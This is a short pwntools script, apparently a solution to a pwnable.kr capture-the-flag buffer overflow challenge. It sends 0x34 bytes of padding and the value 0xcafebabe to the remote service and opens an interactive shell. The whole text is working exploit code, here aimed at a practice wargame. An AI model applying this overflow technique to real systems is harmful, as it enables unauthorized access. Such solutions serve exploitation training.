from pwn import *

REMOTE_ADDRESS = "pwnable.kr"
REMOTE_PORT = 9000

sh = remote(REMOTE_ADDRESS, REMOTE_PORT)

shellcode = b'a' * 0x34 + p32(0xcafebabe)

sh.sendline(shellcode)
sh.interactive()

sh.close()